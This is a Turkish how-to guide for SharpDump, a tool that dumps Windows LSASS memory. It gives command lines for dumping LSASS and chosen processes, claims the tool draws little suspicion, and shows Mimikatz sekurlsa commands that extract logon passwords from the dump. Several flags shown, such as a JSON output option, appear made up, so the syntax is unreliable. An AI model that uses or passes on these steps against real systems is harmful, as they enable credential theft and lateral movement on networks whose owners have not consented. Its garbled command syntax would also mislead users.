# SharpDump.exe Kullanım Kılavuzu

## Giriş
SharpDump, Windows bellek alanından LSASS (Local Security Authority Subsystem Service) gibi kritik proseslerden çekirdek dump alma aracıdır. Bu aracın ana amacı, bellek içeriğinden hassas bilgileri toplamak ve sıklıkla kimlik bilgileri (credentials) elde etmek için kullanılmasıdır.

---

## Özellikler
- **Bellek Dump Alma**: LSASS gibi hedef proseslerden dump alır.
- **Windows Task Manager veya Sysinternals Aracı Gerekliliği Yok**: Bu işlem için ek yazılımlara gerek duymaz.
- **Yüksek Hızlı İşlem**: Minimum şupe uyandıracak şekilde dump oluşturur.

---

## Gereksinimler
- Windows işletim sistemi
- Yüksek yetkiler (Çoğunlukla Administrator veya SYSTEM yetkisi gerekir)

---

## Komut Satırı Kullanımı

### Yardım Mesajını Görüntüleme
SharpDump'un desteklediği komutları ve kullanım detaylarını görmek için:
```cmd
SharpDump.exe -h
```

### LSASS Dump Alma
LSASS prosesinin dumpını almak için:
```cmd
SharpDump.exe -WriteMiniDump "C:\Temp\lsass.dmp"
```

### Tüm Proseslerin Listesini Çıkarma
Sistemde çalışan tüm prosesleri listelemek için:
```cmd
SharpDump.exe -ListProcesses
```

### Belirli Bir Prosesin Dumpını Alma
Özellikle belirli bir prosesin (PID ile) dumpını almak için:
```cmd
SharpDump.exe -WriteMiniDump "C:\Temp\specific_process.dmp" -ProcessId 1234
```

### JSON Formatında Çıktı
Toplanan verileri JSON formatında bir dosyaya kaydetmek için:
```cmd
SharpDump.exe -WriteMiniDump "C:\Temp\lsass.json" -OutputFormat json
```

---

## Örnek Kullanımlar

### LSASS Belleğinden Kimlik Bilgisi Toplama
LSASS dump alıp daha sonra Mimikatz gibi bir araçla analiz etmek için:
```cmd
SharpDump.exe -WriteMiniDump "C:\Temp\lsass.dmp"
```
Ardından, dump dosyasını Mimikatz'da analiz edin:
```cmd
mimikatz.exe
sekurlsa::minidump C:\Temp\lsass.dmp
sekurlsa::logonPasswords
```

### Tüm Bellek Dumpını Listeleme ve Kayıt
Tüm bellek dump işlem adımlarını görüntülemek ve bir log dosyasına kaydetmek için:
```cmd
SharpDump.exe -LogProcesses "C:\Temp\process_log.txt"
```

---

## Derleme Talimatları
SharpDump kaynak koddan derlenebilir.

### Adımlar:
1. Visual Studio Community Edition'ı yükleyin.
2. Projeyi açın (`SharpDump.sln`).
3. Çözüm yapılandırmasını "Release" olarak seçin.
4. Projeyi derleyin.

---

## Kaynaklar
- [SharpDump GitHub](https://github.com/GhostPack/SharpDump)
- [GhostPack Belgeleri](https://posts.specterops.io/)

Bu rehber, SharpDump aracını kullanmanın temel adımlarını kapsamaktadır. Daha fazla bilgi için yukarıdaki bağlantılara göz atabilirsiniz.
